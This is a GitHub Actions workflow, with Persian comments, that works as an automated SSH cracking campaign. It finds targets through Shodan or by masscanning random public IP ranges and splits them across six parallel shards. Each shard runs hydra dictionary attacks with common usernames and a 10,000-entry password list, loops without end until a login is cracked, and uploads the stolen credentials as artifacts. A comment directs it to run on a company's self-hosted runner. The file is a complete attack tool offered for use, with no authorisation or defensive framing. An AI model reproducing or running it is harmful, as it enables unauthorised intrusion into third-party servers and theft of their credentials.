name: ∞ Persistent Auto SSH Cracker

on:
  workflow_dispatch:  # فقط دستی

jobs:
  auto-attack:
    runs-on: [self-hosted, linux]  # حتماً باید روی رانر شخصی شرکت اجرا بشه
    strategy:
      fail-fast: false
      matrix:
        shard: [0,1,2,3,4,5]

    steps:
      - name: 🛠️ Install ultra tools
        run: |
          sudo apt update
          sudo apt install -y masscan hydra sshpass jq curl

      - name: 🔁 Persistent loop (never stops until success)
        id: persistent
        run: |
          SHARD_ID=${{ matrix.shard }}
          TOTAL_SHARDS=${{ strategy.job-total }}
          FOUND=0
          RESULT_FILE="creds_${SHARD_ID}.txt"
          PASSWORDS_FILE="passwords.txt"
          # دیکشنری بزرگ رمز (میتونی فایل رو از جای دیگه بیاری)
          curl -s -o $PASSWORDS_FILE https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt || \
            echo -e "123456\npassword\nadmin\nroot\n12345678" > $PASSWORDS_FILE

          USERNAMES=("root" "admin" "user" "ubuntu" "pi" "oracle")

          # حلقه بی‌نهایت
          while [ $FOUND -eq 0 ]; do
            echo "[*] Auto-discovering fresh targets (Shard $SHARD_ID)..."

            # ========== 1. کشف خودکار هاست ==========
            TARGETS_FILE="targets_${SHARD_ID}.txt"
            > $TARGETS_FILE

            # روش اول: استفاده از Shodan (اگر API key تنظیم شده باشد)
            if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
              curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22&size=100" | \
                jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS_FILE
            fi

            # اگر تعداد هاست کم است، مکمل با masscan تصادفی روی چند شبکه عمومی (به صورت تصادفی)
            if [ $(wc -l < $TARGETS_FILE) -lt 50 ]; then
              # تولید یک زیرشبکه تصادفی کلاس C
              RANDOM_A=$((RANDOM%223+1))
              RANDOM_B=$((RANDOM%256))
              RANDOM_C=$((RANDOM%256))
              SUBNET="${RANDOM_A}.${RANDOM_B}.${RANDOM_C}.0/24"
              sudo masscan $SUBNET -p22 --rate=1000 --wait=0 -oL masscan.raw 2>/dev/null
              grep -E "open" masscan.raw | awk '{print $4":"$3}' >> $TARGETS_FILE
            fi

            # حذف تکراری‌ها
            sort -u -o $TARGETS_FILE $TARGETS_FILE

            # ========== 2. تقسیم هاست بین شاردها با هش ==========
            MY_HOSTS="myhosts_${SHARD_ID}.txt"
            > $MY_HOSTS
            while read line; do
              ip=$(echo $line | cut -d: -f1)
              # هش ساده آی‌پی برای اختصاص به یک شارد
              hash=$(echo $ip | md5sum | cut -c1-8)
              hash_num=$((16#$hash))
              if [ $((hash_num % TOTAL_SHARDS)) -eq $SHARD_ID ]; then
                echo $line >> $MY_HOSTS
              fi
            done < $TARGETS_FILE

            if [ ! -s $MY_HOSTS ]; then
              echo "No hosts assigned to shard $SHARD_ID, sleeping 10s..."
              sleep 10
              continue
            fi

            # ========== 3. حمله با Hydra روی هاست‌های خود ==========
            while read target; do
              ip=$(echo $target | cut -d: -f1)
              port=$(echo $target | cut -d: -f2)

              for username in "${USERNAMES[@]}"; do
                # تنظیم timeout برای هر هاست
                echo "[>] Shard $SHARD_ID attacking $ip:$port as $username"
                hydra -l "$username" -P $PASSWORDS_FILE -s "$port" -t 64 -o hydra_out.txt -f "$ip" ssh 2>/dev/null

                if grep -q "host: $ip.*password:" hydra_out.txt; then
                  password=$(grep "host: $ip.*password:" hydra_out.txt | head -1 | awk -F 'password: ' '{print $2}')
                  echo "🎉 SUCCESS: $ip:$port|$username|$password" | tee -a $RESULT_FILE
                  FOUND=1
                  break 3
                fi
              done
            done < $MY_HOSTS

            # اگر پیدا نشد، سریع بره مرحله بعد (بدون sleep)
            echo "No credentials found in this batch. Scanning new targets..."
          done

      - name: Upload credentials (if found)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: final-creds-shard-${{ matrix.shard }}
          path: creds_*.txt
